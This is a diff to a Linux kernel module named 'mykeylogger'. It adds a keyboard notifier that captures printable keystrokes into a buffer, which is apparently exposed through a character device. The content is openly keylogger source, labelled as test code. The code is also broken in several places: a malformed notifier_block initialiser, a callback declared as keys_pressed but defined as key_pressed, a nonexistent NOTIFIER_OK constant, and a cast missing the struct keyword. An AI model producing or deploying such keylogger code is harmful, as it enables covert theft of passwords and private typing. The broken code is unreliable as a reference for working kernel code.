@@ -4,35 +4,51 @@
 #include <linux/device.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
+#include <linux/keyboard.h>
+#include <linux/notifier.h>
 
 #define DEVICE_NAME "mykeylogger"
 #define CLASS_NAME "MKL"
+
+#define LOG_MAX 2048
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hiziri");
 MODULE_DESCRIPTION("This Module is Test Code.");
 MODULE_VERSION("0.1");
 
+// mod info
 static int majourNumber;
-static char log[2048] = {0};
-static int log_size;
 static struct class* mkl_class = NULL;
 static struct device* mkl_dev = NULL;
-
 static char *module_name = DEVICE_NAME;
 module_param(module_name, charp, S_IRUGO);
 
+// logger info
+static char log[LOG_MAX] = {0};
+static char *log_p = log;
+static int log_size;
+
+// definition
 static int dev_open(struct inode *, struct file *);
 static int dev_release(struct inode *, struct file *);
 static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
 static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);
 
+static int keys_pressed(struct notifier_block *, unsigned long, void *);
+
+// set dev ops
 static struct file_operations fops = {
   .open = dev_open,
   .read = dev_read,
   .write = dev_write,
   .release = dev_release,
 };
+
+// set notifier
+static struct notifier_block nb = {
+  notifier_call = keys_pressed
+}
 
 static int __init my_key_logger_init(void){
   printk(KERN_INFO "MKL: %s is Loaded!", module_name);
@@ -103,6 +119,30 @@ static ssize_t dev_write(struct file *file_p, const char *buffer, size_t len, lo
 static int dev_release(struct inode *inode_p, struct file *file_p) {
   printk(KERN_INFO "%s: close\n", CLASS_NAME);
   return 0;
+}
+
+static int key_pressed(struct notifier_block *nb, unsigned long action, void *data){
+  struct keyboard_notifier_param *param = (keyboard_notifier_param *)data;
+
+  if (action == KBD_KEYSYM && param->down) {
+    char c = param->value;
+
+    if (c == 0x01) {
+      *(log_p++) = 0x0a;
+      log_size++;
+    } else if (c >= 0x20 && c < 0x7f) {
+      *(log_p++) = c;
+      log_size++;
+    }
+
+    if (log_size >= LOG_MAX) { // if overflow, reset logs
+      log_size = 0;
+      memset(log, 0, LOG_MAX); // init by 0
+      log_p = log;
+    }
+  }
+  
+  return NOTIFIER_OK; // everything ok
 }
 
 module_init(my_key_logger_init);
